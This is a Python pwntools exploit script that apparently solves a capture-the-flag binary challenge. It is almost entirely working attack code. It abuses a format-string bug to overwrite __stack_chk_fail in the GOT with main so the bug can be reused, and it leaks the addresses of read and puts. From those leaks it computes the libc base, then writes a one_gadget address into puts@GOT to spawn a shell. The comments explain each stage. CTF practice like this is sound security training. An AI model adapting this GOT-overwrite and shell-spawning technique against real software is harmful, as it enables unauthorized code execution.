#!/usr/bin/python3
from pwn import *

elf = ELF("./chall")
libc = ELF("./libc6_2.36-0ubuntu4_amd64.so")
context.binary = elf

HOST = "127.0.0.1"
PORT = 9998

gs = """
# b *main
continue
"""

# context.log_level = "debug"


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(elf.path)


def main():
    global io
    io = start()

    # =-=-= STAGE 1: Infinite format strings & leaks =-=-=
    # There is 1 byte overflow so we can change stack canary,
    # which will call __stack_chk_fail, so why not overwrite it with main?
    payload_len = 3*16+8+1
    payload = f"%{(elf.sym.main) & 0xffff}c%10$hn|%11$s|%12$s|".encode()
    assert len(payload) <= 0x20
    payload = payload.ljust(0x20, b"A")  # 6-9
    payload += p64(elf.got.__stack_chk_fail)  # 10
    payload += p64(elf.got.read)  # 11
    payload += p64(elf.got.puts)  # 12
    assert len(payload) <= payload_len
    payload = payload.ljust(payload_len, b"A")
    io.send(payload)

    # =-=-= STAGE 2: Get libc leaks =-=-=
    # Because libc is not given, we need libc leaks
    # which we can give to libc database (example: https://libc.rip)
    # to find the libc used by the remote server.
    # Then run patchelf / pwninit to attach the libc to our local binary.
    leaks = io.clean().split(b"|")
    read, puts = u64(leaks[1].ljust(8, b"\x00")), u64(
        leaks[2].ljust(8, b"\x00"))
    log.info(f"read: {hex(read)}")
    log.info(f"puts: {hex(puts)}")

    libc.address = read - libc.sym.read
    log.info(f"libc: {hex(libc.address)}")

    # =-=-= STAGE 3: Overwrite puts@got -> one_gadget =-=-=
    # There is a puts call after the format string bug.
    # So, we can overwrite puts@got with one_gadget to get a shell.
    # one_gadgets = [libc.address+offs for offs in [0xe3afe, 0xe3b01, 0xe3b04]]
    one_gadgets = [libc.address+offs for offs in [0x4e1d0, 0xe4159, 0xe41b3]]
    one_gadget = one_gadgets[1]
    log.info(f"one_gadget: {hex(one_gadget)}")

    write_vals = [(one_gadget >> 16) & 0xff, one_gadget & 0xffff]

    payload = f"%{write_vals[0]}c%10$hhn".encode()
    payload += f"%{write_vals[1]-write_vals[0]}c%11$hn".encode()
    assert len(payload) <= 0x20
    payload = payload.ljust(0x20, b"A")  # 6-9
    payload += p64(elf.got.puts+2)  # 10
    payload += p64(elf.got.puts)  # 11
    io.sendline(payload)

    io.clean()

    io.interactive()


if __name__ == "__main__":
    main()
